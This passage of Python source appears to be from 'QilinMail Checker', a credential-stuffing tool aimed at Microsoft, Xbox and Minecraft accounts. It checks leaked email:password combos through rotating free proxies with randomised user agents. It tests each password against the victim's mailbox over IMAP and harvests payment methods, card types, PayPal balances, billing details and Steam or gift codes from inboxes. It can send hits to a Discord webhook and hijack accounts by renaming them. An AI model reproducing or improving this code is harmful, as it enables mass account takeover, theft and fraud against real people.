        self.settings = {'max_retries': 4, 'timeout': 15, 'threads': 100, 'use_proxies': False, 'check_xbox_game_pass': True, 'check_minecraft_ownership': True, 'check_hypixel_rank': True, 'check_payment': False, 'auto_proxy': False, 'proxy_api': '', 'request_num': 3, 'proxy_time': 5, 'check_microsoft_balance': False, 'check_rewards_points': False, 'check_payment_methods': False, 'check_subscriptions': False, 'check_orders': False, 'check_billing_address': False, 'scan_inbox': False, 'save_bad': False, 'inbox_keywords': 'Microsoft,Steam,Xbox,Game Pass,Purchase,Order,Confirmation,Receipt,Payment'}
        self.config = configparser.ConfigParser()
        self.update_config_schema()
        print(f'{Fore.GREEN}✓ Created default configuration file: {self.config_file}{Fore.RESET}')
    def update_config_schema(self):
        defaults = {
            'General': {
                'threads': '100',
                'timeout': '15',
                'max_retries': '4',
                'use_proxies': 'False'
            },
            'Performance': {
                'optimize_network': 'True',
                'connection_pool_size': '100',
                'dns_cache_enabled': 'True',
                'keep_alive_enabled': 'True'
            },
            'Proxy': {
                'Auto_Proxy': 'False',
                'Proxy_Api': '',
                'Request_Num': '3',
                'Proxy_Time': '5',
                'proxy_rotation': 'True',
                'verify_ssl': 'False'
            },
            'Features': {
                'check_xbox_game_pass': 'True',
                'check_xbox_game_pass_ultimate': 'True',
                'check_minecraft_ownership': 'True',
                'check_minecraft_capes': 'True',
                'check_optifine_cape': 'True',
                'check_name_change': 'True',
                'check_last_name_change': 'True',
                'check_hypixel_rank': 'True',
                'check_hypixel_level': 'True',
                'check_hypixel_first_login': 'True',
                'check_hypixel_last_login': 'True',
                'check_hypixel_ban_status': 'True',
                'check_bedwars_stars': 'True',
                'check_skyblock_coins': 'True',
                'check_skyblock_networth': 'True',
                'check_payment': 'False',
                'check_credit_cards': 'False',
                'check_paypal': 'False',
                'check_billing_address': 'False',
                'check_subscriptions': 'False',
                'check_purchase_history': 'False',
                'check_microsoft_balance': 'False',
                'check_reward_points': 'False',
                'check_orders': 'False',
                'check_payment_methods': 'False',

                'check_email_access': 'True',
                'check_two_factor': 'True'
            },
            'Inbox': {
                'scan_inbox': 'False',
                'inbox_keywords': 'steam, netflix, Crunchyroll',
                'max_inbox_messages': '50',
                'save_full_emails': 'False'
            },
            'BanChecking': {
                'enable_ban_checking': 'True',
                'hypixelban': 'True',
                'use_ban_proxies': 'False'
            },
            'Data_Collection': {
                'hypixel_name': 'True',
                'hypixel_level': 'True',
                'first_hypixel_login': 'True',
                'last_hypixel_login': 'True',
                'optifine_cape': 'True',
                'minecraft_capes': 'True',
                'email_access': 'True',
                'hypixel_skyblock_coins': 'True',
                'hypixel_bedwars_stars': 'True',
                'hypixel_ban': 'True',
                'name_change_availability': 'True',
                'last_name_change': 'True',
                'payment': 'False'
            },
            'File_Output': {
                'save_hits': 'True',
                'save_bad': 'True',
                'save_valid_mail': 'True',
                'save_2fa': 'True',
                'save_banned': 'True',
                'save_unbanned': 'True',
                'save_mfa': 'True',
                'save_sfa': 'True',
                'save_normal_minecraft': 'True',
                'save_xbox_game_pass': 'True',
                'save_xbox_game_pass_ultimate': 'True',
                'save_other': 'True',
                'create_capture_file': 'True',
                'create_separate_files': 'True'
            },
            'Discord': {
                'enable_notifications': 'False',
                'discord_webhook_url': '',
                'webhook_username': 'QilinMail Checker',
                'webhook_avatar_url': 'https://i.imgur.com/4M34hi2.png',
                'notify_on_hit': 'True',
                'notify_on_game_pass': 'True',
                'notify_on_payment': 'False',
                'notify_on_2fa': 'False',
                'notify_on_mfa': 'True',
                'notify_on_hypixel_rank': 'True',
                'embed_color_hit': '#57F287',
                'embed_color_xgp': '#3498DB',
                'embed_thumbnail': 'True',
                'embed_footer': 'True',
                'embed_thumbnail_url': 'https://i.imgur.com/4M34hi2.png',
                'embed_image_enabled': 'True',
                'embed_image_template': 'https://hypixel.paniek.de/signature/{uuid}/general-tooltip'
            },
            'Security': {
                'mark_mfa': 'True',
                'mark_sfa': 'True'
            },
            'RateLimit': {
                'delay_between_checks': '0',
                'random_delay': 'True',
                'min_delay': '0',
                'max_delay': '2',
                'respect_429': 'True',
                'pause_on_429': '20',
                'random_user_agent': 'True',
                'warn_on_slow_check': 'False',
                'slow_check_warn_seconds': '75'
            },
            'Filters': {
                'min_hypixel_level': '0',
                'min_bedwars_stars': '0',
                'min_skyblock_coins': '0',
                'min_account_balance': '0',
                'require_payment_method': 'False',
                'require_full_access': 'False',
                'require_unbanned': 'False'
            },
            'AutoOps': {
                'auto_set_name': 'False',
                'custom_name_format': 'Qilin_{random_letter}_{random_number}',
                'auto_set_skin': 'False',
                'skin_url': 'http://textures.minecraft.net/texture/example',
                'skin_variant': 'classic'
            },
            'DonutSMP': {
                'donut_stats': 'False',
                'donut_api_key': ''
            },
            'UI': {
                'show_live_logs': 'True',
                'print_to_console': 'True',
                'colored_output': 'True',
                'verbose_mode': 'False',
                'theme': 'blue'
            }
        }
        updated = False
        for section, options in defaults.items():
            if not self.config.has_section(section):
                self.config.add_section(section)
                updated = True
            for key, value in options.items():
                if not self.config.has_option(section, key):
                    self.config.set(section, key, str(value))
                    updated = True
        if updated:
            try:
                with open(self.config_file, 'w', encoding='utf-8') as f:
                    self.config.write(f)
                pass
            except Exception as e:
                print(f'{Fore.YELLOW}⚠ Could not update config schema: {e}{Fore.RESET}')
    def parse_all_sections(self):
        for section in self.config.sections():
            for key, value in self.config.items(section):
                try:
                    self.settings[key] = self.parse_value(value)
                except (ValueError, TypeError):
                    continue
    def parse_value(self, value):
        if not isinstance(value, str):
            return value
        value = value.strip()
        if value.lower() in ('true', 'yes', '1', 'on'):
            return True
        if value.lower() in ('false', 'no', '0', 'off'):
            return False
        try:
            if '.' not in value:
                return int(value)
            return float(value)
        except ValueError:
            pass
        return value
    def get(self, key, default=None):
        return self.settings.get(key, default)
    def get_proxy_config(self):
        return {'auto_proxy': self.get('auto_proxy', False), 'proxy_api': self.get('proxy_api', ''), 'request_num': self.get('request_num', 3), 'proxy_time': self.get('proxy_time', 5)}
    def get_checker_config(self):
        return {'hypixelname': self.get('check_hypixel_rank', True), 'hypixellevel': self.get('check_hypixel_level', True), 'hypixelfirstlogin': self.get('check_hypixel_first_login', True), 'hypixellastlogin': self.get('check_hypixel_last_login', True), 'hypixelban': self.get('check_hypixel_ban_status', True), 'hypixelbwstars': self.get('check_bedwars_stars', True), 'hypixelsbcoins': self.get('check_skyblock_coins', True), 'payment': self.get('check_payment', True), 'access': self.get('check_email_access', True), 'optifinecape': self.get('check_optifine_cape', True), 'namechange': self.get('check_name_change', True), 'lastchanged': self.get('check_last_name_change', True), 'setname': self.get('auto_set_name', False), 'name': self.get('custom_name_format', 'Qilin'), 'setskin': self.get('auto_set_skin', False), 'skin': self.get('skin_url', 'http://textures.minecraft.net/texture/31f477eb1a7beee631c2ca64d06f8f68fa93a3386d04452ab27f43acdf1b60cb'), 'variant': self.get('skin_variant', 'classic'), 'mark_mfa': self.get('mark_mfa', True), 'mark_sfa': self.get('mark_sfa', True), 'donut_stats': self.get('donut_stats', True), 'donut_api_key': self.get('donut_api_key', ''), 'save_bad': self.get('save_bad', False)}
    def get_general_config(self):
        return {'max_retries': self.get('max_retries', 3), 'timeout': self.get('timeout', 15), 'threads': self.get('threads', 10), 'use_proxies': self.get('use_proxies', False)}
    def get_capture_config(self):
        return {'hypixel_name': self.get('hypixel_name', True), 'hypixel_level': self.get('hypixel_level', True), 'first_hypixel_login': self.get('first_hypixel_login', True), 'last_hypixel_login': self.get('last_hypixel_login', True), 'optifine_cape': self.get('optifine_cape', True), 'minecraft_capes': self.get('minecraft_capes', True), 'email_access': self.get('email_access', True), 'hypixel_skyblock_coins': self.get('hypixel_skyblock_coins', True), 'hypixel_bedwars_stars': self.get('hypixel_bedwars_stars', True), 'hypixel_ban': self.get('hypixel_ban', True), 'name_change_availability': self.get('name_change_availability', True), 'last_name_change': self.get('last_name_change', True), 'payment': self.get('payment', True), 'donut_stats': self.get('donut_stats', True)}
sFTTag_url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'
Combos = []
proxylist = []
banproxies = []
fname = ''
screen = "'2'"
proxytype = "'4'"
proxy_api_url = ''
auto_proxy = False
proxy_request_num = 3
proxy_time = 5
last_proxy_fetch = 0
proxy_refresh_time = 5
DONUT_API_URL = 'https://api.donutsmp.net/v1/stats/'
api_socks4 = ['https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks4&timeout=15000&proxy_format=ipport&format=text', 'https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt', 'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks4/data.txt']
api_socks5 = ['https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks5&timeout=15000&proxy_format=ipport&format=text', 'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt', 'https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt', 'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt']
api_http = ['https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt', 'https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt']
hits, bad, twofa, cpm, cpm1, errors, retries, checked, vm, sfa, mfa, maxretries, xgp, xgpu, other, minecraft_capes, optifine_capes, inbox_matches, name_changes, payment_methods, automarklost = (0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0)
stats_lock = threading.Lock()
urllib3.disable_warnings()
warnings.filterwarnings('ignore')
def is_no_proxy():
    pt = str(proxytype).strip()
    pt = pt.replace("'", '').replace('"', '')
    return pt == '4'
class Config:
    def __init__(self):
        self.data = {}
    def set(self, key, value):
        self.data[key] = value
    def get(self, key, default=None):
        return self.data.get(key, default)
config = Config()
class Capture:
    def __init__(self, email, password, name, capes, uuid, token, type, session):
        self.email = email
        self.password = password
        self.name = name
        self.capes = capes
        self.uuid = uuid
        self.token = token
        self.type = type
        self.session = session
        self.hypixl = None
        self.level = None
        self.firstlogin = None
        self.lastlogin = None
        self.cape = None
        self.access = None
        self.sbcoins = None
        self.bwstars = None
        self.banned = None
        self.namechanged = None
        self.namechange_available = None
        self.lastchanged = None
        self.ms_balance = None
        self.ms_rewards = None
        self.ms_orders = []
        self.ms_payment_methods = []
        self.inbox_matches = []
        self.ban_checked = False
        self.ms_recovery_email = None
        self.ms_phone_hint     = None
        self.ms_country        = None
        self.og_name           = None
        self.cubecraft_stats   = None
        self.lunar_stats       = None
        self.dungeons_level    = None
        self.swstars           = None
        self.sbnetworth        = None
        self.pitcoins          = None
        self.value_score       = 0
        self.value_tier        = 'C'
        self.skin_info         = None
        self.cape_value_str    = None
        self.account_age       = None
        self.twofa_type        = None
        self.sub_expiry        = None
        self.xbox_gamertag     = None
        self.alt_type          = None
        self.gift_card_bal     = None
        self.guild_info        = None
        self.capes_dev         = None
        self.labymod_info      = None
        self.badlion_info      = None
        self.tlauncher_cape    = None
        self.fivezig_cape      = None
        self.mineskin_info     = None
        self.mineplex_info     = None
        self.wynncraft_info    = None
        self.hive_info         = None
        self.pika_info         = None
        self.gommehd_info      = None
        self.mineheroes_info   = None
        self.minemen_info      = None
        self.slothpixel_info   = None
        self.github_info       = None
        # v3 ekstra ozellikler
        self.cosmetica_info    = None
        self.essential_info    = None
        self.mccapes_info      = None
        self.quasar_cape       = None
        self.feather_info      = None
        self.salwyrr_info      = None
        self.zeqa_info         = None
        self.jartex_info       = None
        self.galaxite_info     = None
        self.name_history      = None
        self.name_rarity       = None
        self.realms_info       = None
        self.breach_info       = None
        self.short_name_value  = None
        self.sw_prestige       = None
        self.mm_kills          = None
        self.mm_wins           = None
        self.bb_score          = None
        self.bb_wins           = None
        self.bedrock_info      = None
        self.namemc_favs       = None
        self.optifine_detail   = None
        self.crafatar_url      = None
        self.paypal_bal        = None
        self.cc_types          = None
        self.billing_detail    = None
        self.active_subs       = None
        self.order_history     = None
        self.linked_accounts   = None
        self.imap_results      = None
    def builder(self, mask_password=False, include_timestamp=False):
        SEP  = '═' * 60
        LINE = '─' * 60
        score = getattr(self, 'value_score', 0)
        tier  = getattr(self, 'value_tier', 'C')
        tier_icon = {'S':'💎','A':'🔥','B':'⚡','C':'·'}.get(tier,'·')
        if self.banned is None or str(self.banned).startswith('[Error]'): ban_str='❓ Unknown'
        elif self.banned and self.banned != 'False': ban_str='🚫 Banned'
        else: ban_str='✅ Unbanned'
        if mask_password:
            pw=self.password
            password_display=pw[:2]+'*'*max(len(pw)-4,0)+pw[-2:] if len(pw)>4 else '*'*len(pw)
        else: password_display=self.password
        tags=[]
        t_up=str(self.type or '').upper()
        if 'ULTIMATE' in t_up or 'XGPU' in t_up: tags.append('[XGPU]')
        elif 'GAME PASS' in t_up or 'XGP' in t_up: tags.append('[XGP]')
        if 'MINECRAFT' in t_up or 'MC' in t_up: tags.append('[MC]')
        if self.capes and self.capes != '': tags.append(f'[{self.capes}]')
        if getattr(self,'cape',None)=='Yes': tags.append('[Optifine]')
        og=getattr(self,'og_name',None)
        if og: tags.append(f'[{og}]')
        try:
            bw=int(getattr(self,'bwstars',0) or 0)
            if bw>0: tags.append(f'[BW★{bw}]')
        except: bw=0
        rank_str=self.hypixl if self.hypixl and self.hypixl!='N/A' else ''
        display_name=rank_str or (self.name if self.name and self.name!='N/A' else 'Unknown')
        if include_timestamp and hasattr(ui,'start_time') and ui.start_time:
            elapsed=int(time.time()-ui.start_time)
            ts=f'[{elapsed//3600:02d}:{elapsed%3600//60:02d}:{elapsed%60:02d}]'
        else: ts=''
        lines=[SEP,f' {tier_icon} [{tier}-Tier | Score:{score}]{" "+ts if ts else ""}',LINE,
               f' Account   : {self.email}:{password_display}',
               f' MC Name   : {display_name}',f' UUID      : {self.uuid or "N/A"}',
               f' Ban Status: {ban_str}',f' Tags      : {" ".join(tags) if tags else "None"}']
        hyp=[]
        if self.level:
            try:
                if float(self.level)>0: hyp.append(f'Lvl:{self.level}')
            except: pass
        try:
            bw_v=int(getattr(self,'bwstars',0) or 0)
            if bw_v>0: hyp.append(f'BW★{bw_v}')
        except: pass
        sw=getattr(self,'swstars',None)
        if sw and str(sw) not in ('0','','N/A','None'): hyp.append(f'SW★{sw}')
        _bws2=getattr(self,'bwstars',None)
        if _bws2 and str(_bws2) not in ('0','','N/A','None'): hyp.append(f'BW★{_bws2}')
        _bwfk=getattr(self,'bw_final_kills',None)
        if _bwfk and int(_bwfk or 0)>0: hyp.append(f'FK:{format_number(int(_bwfk))}')
        dg=getattr(self,'dungeons_level',None)
        if dg: hyp.append(f'Cata:{dg}')
        if self.firstlogin: hyp.append(f'First:{self.firstlogin}')
        if self.lastlogin:  hyp.append(f'Last:{self.lastlogin}')
        if hyp: lines+=[LINE,f' Hypixel   : {" | ".join(hyp)}']
        sb=[]
        nw=getattr(self,'sbnetworth',None); coins=getattr(self,'sbcoins',None); pit=getattr(self,'pitcoins',None)
        if nw and str(nw) not in ('','N/A','None'): sb.append(f'NW:{nw}')
        if coins and str(coins) not in ('','N/A','None'): sb.append(f'Purse:{coins}')
        if pit and str(pit) not in ('','N/A','None'): sb.append(f'PitGold:{pit}')
        if sb: lines.append(f' SkyBlock  : {" | ".join(sb)}')
        cc=getattr(self,'cubecraft_stats',None); lunar=getattr(self,'lunar_stats',None)
        if cc or lunar: lines.append(LINE)
        if cc:    lines.append(f' CubeCraft : {cc}')
        if lunar: lines.append(f' Lunar     : {lunar}')
        ms=[]
        bal=getattr(self,'ms_balance',None)
        if bal and str(bal) not in ('0.00 USD','0 USD','None','','None USD'): ms.append(f'Balance:{bal}')
        if self.type: ms.append(str(self.type))
        rew=getattr(self,'ms_rewards',None)
        if rew: ms.append(f'Rewards:{rew}pts')
        ctry=getattr(self,'ms_country',None)
        if ctry: ms.append(f'Country:{ctry}')
        if ms: lines+=[LINE,f' Microsoft : {" | ".join(ms)}']
        pms=getattr(self,'ms_payment_methods',[])
        if pms: lines.append(f' Payment   : {", ".join(pms)}')
        rec=getattr(self,'ms_recovery_email',None)
        if rec: lines.append(f' Recovery  : {rec}')
        phone=getattr(self,'ms_phone_hint',None)
        if phone: lines.append(f' Phone     : {phone}')
        acc=[]
        if self.access: acc.append(f'Email:{"✅" if self.access=="True" else "❌"}')
        nc=getattr(self,'namechange_available',None)
        if nc is not None: acc.append(f'NameChange:{"✅" if nc else "❌"}')
        lc=getattr(self,'lastchanged',None)
        if lc: acc.append(f'LastChange:{lc}')
        if acc: lines+=[LINE,f' Account   : {" | ".join(acc)}']
        ext=[]
        skin=getattr(self,'skin_info',None)
        if skin: ext.append(f'Skin:{skin}')
        cv=getattr(self,'cape_value_str',None)
        if cv: ext.append(f'Cape:{cv}')
        age=getattr(self,'account_age',None)
        if age: ext.append(f'Age:{age}')
        t2=getattr(self,'twofa_type',None)
        if t2: ext.append(f'2FA:{t2}')
        xtag=getattr(self,'xbox_gamertag',None)
        if xtag and xtag!=self.name: ext.append(f'Xbox:{xtag}')
        alt=getattr(self,'alt_type',None)
        if alt: ext.append(f'Alt:{alt}')
        exp=getattr(self,'sub_expiry',None)
        if exp: ext.append(f'SubExp:{exp}')
        gcb=getattr(self,'gift_card_bal',None)
        if gcb: ext.append(f'GiftCard:{gcb}')
        gi=getattr(self,'guild_info',None)
        if gi: ext.append(f'Guild:{gi}')
        cdv=getattr(self,'capes_dev',None)
        if cdv: ext.append(f'Capes:{cdv}')
        laby=getattr(self,'labymod_info',None)
        if laby: ext.append(f'LabyMod:{laby}')
        bdl=getattr(self,'badlion_info',None)
        if bdl: ext.append(f'Badlion:{bdl}')
        tl=getattr(self,'tlauncher_cape',None)
        if tl: ext.append(f'TL:{tl}')
        fz=getattr(self,'fivezig_cape',None)
        if fz: ext.append(f'5zig:Yes')
        ms_skin=getattr(self,'mineskin_info',None)
        if ms_skin: ext.append(f'MineSkin:{ms_skin}')
        mpx=getattr(self,'mineplex_info',None)
        if mpx: lines+=[LINE,f' Mineplex  : {mpx}']
        wyc=getattr(self,'wynncraft_info',None)
        if wyc: lines+=[LINE,f' Wynncraft : {wyc}']
        hv=getattr(self,'hive_info',None)
        if hv: lines+=[LINE,f' Hive      : {hv}']
        pk=getattr(self,'pika_info',None)
        if pk: lines+=[LINE,f' PikaNet   : {pk}']
        gh=getattr(self,'gommehd_info',None)
        if gh: lines+=[LINE,f' GommeHD   : {gh}']
        mh=getattr(self,'mineheroes_info',None)
        if mh: lines+=[LINE,f' MineHeroes: {mh}']
        mmn=getattr(self,'minemen_info',None)
        if mmn: lines+=[LINE,f' Minemen   : {mmn}']
        slth=getattr(self,'slothpixel_info',None)
        bws=getattr(self,'bwstars',None)
        if slth:
            lines+=[LINE,f' Hypixel   : {slth}']
            if bws and int(bws or 0) > 0: lines.append(f' BW Stars  : {bws}★')
        elif bws and int(bws or 0) > 0:
            lines+=[LINE,f' BW Stars  : {bws}★']
        ghub=getattr(self,'github_info',None)
        if ghub: ext.append(f'GitHub:{ghub}')
        cosm=getattr(self,'cosmetica_info',None)
        if cosm: ext.append(f'Cosmetica:{cosm}')
        ess=getattr(self,'essential_info',None)
        if ess: ext.append(f'Essential:{ess}')
        mcc=getattr(self,'mccapes_info',None)
        if mcc: ext.append(f'MCCapes:{mcc}')
        qsr=getattr(self,'quasar_cape',None)
        if qsr: ext.append('QuasarCape:Yes')
        fth=getattr(self,'feather_info',None)
        if fth: ext.append(f'Feather:{fth}')
        sal=getattr(self,'salwyrr_info',None)
        if sal: ext.append(f'Salwyrr:{sal}')
        nh=getattr(self,'name_history',None)
        if nh: ext.append(f'PrevNames:{nh}')
        nr=getattr(self,'name_rarity',None)
        if nr: ext.append(f'Rarity:{nr}')
        snv=getattr(self,'short_name_value',None)
        if snv: ext.append(f'NameValue:{snv}')
        zqa=getattr(self,'zeqa_info',None)
        if zqa: lines+=[LINE,f' Zeqa      : {zqa}']
        jrx=getattr(self,'jartex_info',None)
        if jrx: lines+=[LINE,f' Jartex    : {jrx}']
        glx=getattr(self,'galaxite_info',None)
        if glx: lines+=[LINE,f' Galaxite  : {glx}']
        rlm=getattr(self,'realms_info',None)
        if rlm: ext.append(f'Realms:{rlm}')
        brc=getattr(self,'breach_info',None)
        if brc: ext.append(f'Breach:{brc}')
        swp=getattr(self,'sw_prestige',None)
        if swp: ext.append(f'SWPrestige:{swp}')
        mmk=getattr(self,'mm_kills',None)
        mmw=getattr(self,'mm_wins',None)
        if mmk or mmw: ext.append(f'MM:{mmk}K/{mmw}W')
        bbs=getattr(self,'bb_score',None)
        if bbs: ext.append(f'BB:{bbs}')
        bdi=getattr(self,'bedrock_info',None)
        if bdi and isinstance(bdi,dict): ext.append(f"Bedrock:{bdi.get('gamertag','')}")
        nmf=getattr(self,'namemc_favs',None)
        if nmf: ext.append(f'NameMC:{nmf}favs')
        ofd=getattr(self,'optifine_detail',None)
        if ofd: ext.append(f'OF:{ofd}')
        ppb=getattr(self,'paypal_bal',None)
        if ppb: ext.append(f'PayPal:{ppb}')
        cct=getattr(self,'cc_types',None)
        if cct: ext.append(f'Cards:{",".join(cct)}')
        bde=getattr(self,'billing_detail',None)
        if bde: ext.append(f'Billing:{bde}')
        asb=getattr(self,'active_subs',None)
        if asb: ext.append(f'Subs:{",".join(asb[:3])}')
        la=getattr(self,'linked_accounts',None)
        if la: ext.append(f'Linked:{",".join(la)}')
        if ext: lines+=[LINE,f' Extended  : {" | ".join(ext)}']
        oh=getattr(self,'order_history',None)
        if oh: lines+=[LINE,f' Orders    : {" | ".join(oh[:5])}']
        ir=getattr(self,'imap_results',None)
        if ir:
            kf=ir.get('keywords_found',[])
            sc=ir.get('steam_codes',[])
            gc=ir.get('gift_codes',[])
            oi=ir.get('order_ids',[])
            if kf: lines+=[LINE,f" IMAP-KW   : {', '.join(kf)}"]
            if sc: lines+=[LINE,f" IMAP-Steam: {', '.join(sc[:3])}"]
            if gc: lines+=[LINE,f" IMAP-Gift : {', '.join(gc[:3])}"]
            if oi: lines+=[LINE,f" IMAP-Order: {', '.join(oi[:3])}"]
        lines.append(SEP)
        full = '\n'.join(lines)
        if config.get('watermark_captures', True):
            full = add_watermark(full)
        return full

    def hypixel(self):
        global errors
        try:
            if config.get('hypixelname') or config.get('hypixellevel') or config.get('hypixelfirstlogin') or config.get('hypixellastlogin') or config.get('hypixelbwstars'):
                try:
                    proxy_to_use = getproxy() if not is_no_proxy() else None
                    resp = self.session.get('https://plancke.io/hypixel/player/stats/' + self.name, proxies=proxy_to_use, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0', 'Accept-Encoding': 'gzip, deflate'}, verify=False, timeout=(5, 8))
                    tx = resp.text
                except Exception:
                    raise
                try:
                    if config.get('hypixelname'):
                        match = HYPIXEL_NAME.search(tx)
                        if match:
                            self.hypixl = match.group()
                            match_title = HYPIXEL_TITLE.search(tx)
                            if match_title:
                                self.hypixl = match_title.group(1)
                            else:
                                try:
                                    pattern = r'\[(VIP\+?|MVP\+\+?|YOUTUBE|ADMIN|MOD|HELPER)\]\s*' + re.escape(self.name)
                                    match_brute = re.search(pattern, tx, re.IGNORECASE)
                                    if match_brute:
                                        self.hypixl = match_brute.group(0) 
                                except:
                                    pass
                except:
                    pass
                try:
                    if config.get('hypixellevel'):
                        match = HYPIXEL_LEVEL.search(tx)
                        if match:
                            self.level = match.group()
                except:
                    pass
                try:
                    if config.get('hypixelfirstlogin'):
                        match = FIRST_LOGIN.search(tx)
                        if match:
                            self.firstlogin = match.group()
                except:
                    pass
                try:
                    if config.get('hypixellastlogin'):
                        match = LAST_LOGIN.search(tx)
                        if match:
                            self.lastlogin = match.group()
                except:
                    pass
                try:
                    if config.get('hypixelbwstars'):
                        match = BW_STARS.search(tx)
                        if match:
                            self.bwstars = match.group()
                except:
                    pass
            if False and config.get('hypixelsbcoins'):
                try:
                    req = self.session.get('https://sky.shiiyu.moe/stats/' + self.name, proxies=getproxy() if not is_no_proxy() else None, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'}, verify=False, timeout=(5, 8))
                    if req.status_code == 200:
                        match = SB_NETWORTH.search(req.text)
                        if match:
                            self.sbcoins = match.group()
                        else:
                            self.sbcoins = 'N/A'
                    else:
                        self.sbcoins = 'N/A'
                except:
                    self.sbcoins = 'N/A'
        except:
            errors += 1
    def optifine(self):
        if config.get('optifinecape') and config.get('optifine_cape', True):
            try:
                txt = self.session.get(f'http://s.optifine.net/capes/{self.name}.png', proxies=getproxy() if not is_no_proxy() else None, verify=False, timeout=8).text
                if 'Not found' in txt:
                    self.cape = 'No'
                else:
                    self.cape = 'Yes'
            except:
                self.cape = 'Unknown'
    def full_access(self):
        global mfa, sfa
        if config.get('access') and config.get('email_access', True):
            try:
                try:
                    domain = self.email.split('@')[1].lower()
                except IndexError:
                    self.access = 'False'
                    sfa += 1
                    return
                imap_server = ''
                if 'gmail.com' in domain or 'googlemail.com' in domain:
                    imap_server = 'imap.gmail.com'
                elif 'yahoo' in domain:
                    imap_server = 'imap.mail.yahoo.com'
                elif 'outlook' in domain or 'hotmail' in domain or 'live' in domain:
                    imap_server = 'outlook.office365.com'
                elif 'icloud' in domain or 'me.com' in domain or 'mac.com' in domain:
                    imap_server = 'imap.mail.me.com'
                elif 'aol.com' in domain:
                    imap_server = 'imap.aol.com'
                else:
                    imap_server = f'imap.{domain}'
                if not imap_server:
                     imap_server = f'imap.{domain}'
                try:
                    mail = imaplib.IMAP4_SSL(imap_server, timeout=_safe_t(10))
                    mail.login(self.email, self.password)
                    mail.logout()
                    self.access = 'True'
                    mfa += 1
                    if config.get('mark_mfa', True):
                        rank_str = f' | {self.hypixl}' if self.hypixl and self.hypixl != 'N/A' else ''
                        with file_lock:
                            with open(f'results/{fname}/MFA.txt', 'a', encoding='utf-8') as f:
                                 f.write(f'{self.email}:{self.password}{rank_str}\n')
                except imaplib.IMAP4.error:
                    sfa += 1
                    self.access = 'False'
                    if config.get('mark_sfa', True):
                        write_dedupe(fname, 'SFA.txt', f'{self.email}:{self.password}\n')
                except Exception as e:
                    self.access = 'Unknown'
            except:
                self.access = 'Unknown'
    def namechange(self):
        global retries
        if (config.get('namechange') or config.get('lastchanged')) and (config.get('name_change_availability', True) or config.get('last_name_change', True)):
            tries = 0
            while tries < maxretries:
                try:
                    check = self.session.get('https://api.minecraftservices.com/minecraft/profile/namechange', headers={'Authorization': f'Bearer {self.token}'}, timeout=_safe_t(10))
                    if check.status_code == 200:
                        try:
                            data = check.json()
                            if config.get('namechange') and config.get('name_change_availability', True):
                                self.namechanged = str(data.get('nameChangeAllowed', 'N/A'))
                                self.namechange_available = data.get('nameChangeAllowed', False)
                                if not config.get('lastchanged'): break
                            if config.get('lastchanged') and config.get('last_name_change', True):
                                created_at = data.get('createdAt')
                                if created_at:
                                    try:
                                        given_date = datetime.strptime(created_at, '%Y-%m-%dT%H:%M:%S.%fZ')
                                    except ValueError:
                                        given_date = datetime.strptime(created_at, '%Y-%m-%dT%H:%M:%SZ')
                                    given_date = given_date.replace(tzinfo=timezone.utc)
                                    formatted = given_date.strftime('%m/%d/%Y')
                                    current_date = datetime.now(timezone.utc)
                                    difference = current_date - given_date
                                    years = difference.days // 365
                                    months = difference.days % 365 // 30
                                    days = difference.days
                                    if years > 0:
                                        self.lastchanged = f"{years} {('year' if years == 1 else 'years')} - {formatted} - {created_at}"
                                    elif months > 0:
                                        self.lastchanged = f"{months} {('month' if months == 1 else 'months')} - {formatted} - {created_at}"
                                    else:
                                        self.lastchanged = f"{days} {('day' if days == 1 else 'days')} - {formatted} - {created_at}"
                                    break
                        except:
                            pass
                    if check.status_code == 429:
                        if proxylist:
                            session.proxies = getproxy()
                            time.sleep(0.3)
                        else:
                            time.sleep(1.0)
                        break
                except:
                    pass
                tries += 1
    def check_donut_smp(self):
        if not config.get('donut_stats', True):
            return
        if not self.name or self.name == 'N/A':
            if UI_ENABLED and ui:
                ui.log_info('Donut SMP: skipped (username unavailable)')
            return
        try:
            donut_api_url = DONUT_API_URL
            donut_api_key = config.get('donut_api_key')
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Accept': 'application/json'}
            if donut_api_key:
                headers['Authorization'] = f'Bearer {donut_api_key}'
            try:
                proxy_config = getproxy() if proxytype != "'4'" else None
            except Exception:
                proxy_config = None
                if UI_ENABLED and ui:
                    ui.log_info('Donut SMP: Proxy error, trying without proxy')
            session = requests.Session()
            retries = Retry(total=3, backoff_factor=0.75, status_forcelist=[429, 500, 502, 503, 504], allowed_methods=['GET'], respect_retry_after_header=True, raise_on_status=False)
            adapter = HTTPAdapter(max_retries=retries)
            session.mount('https://', adapter)
            session.mount('http://', adapter)
            proxy_candidates = []
            if proxytype != "'4'":
                try:
                    for _ in range(4):
                        px = getproxy()
                        if p:
                            proxy_candidates.append(p)
                except Exception:
                    pass
            unique = []
            seen = set()
            for p in proxy_candidates:
                key = str(p)
                if key not in seen:
                    seen.add(key)
                    unique.append(p)
            proxy_candidates = unique + [None]
            valid_proxies = []
            for p in proxy_candidates:
                try:
                    r = session.get('https://api.donutsmp.net/index.html', headers=headers, proxies=p, verify=False, timeout=_safe_t(10))
                    if r.status_code == 200:
                        valid_proxies.append(p)
                    elif UI_ENABLED and ui:
